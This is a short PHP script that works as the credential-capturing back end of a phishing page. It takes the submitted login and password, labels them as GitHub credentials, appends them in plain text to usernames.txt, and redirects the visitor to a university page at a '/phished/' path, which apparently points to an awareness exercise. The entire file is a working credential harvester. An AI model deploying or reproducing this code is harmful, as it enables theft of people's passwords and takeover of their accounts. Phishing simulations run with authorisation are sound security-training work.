<?php
$username = $_POST['login'];
$password = $_POST['password'];
file_put_contents("usernames.txt", "Github Username: " . $username . " Pass: " . $password . "\n", FILE_APPEND);
header('Location: https://its.lmu.edu/phished/');
exit();
?>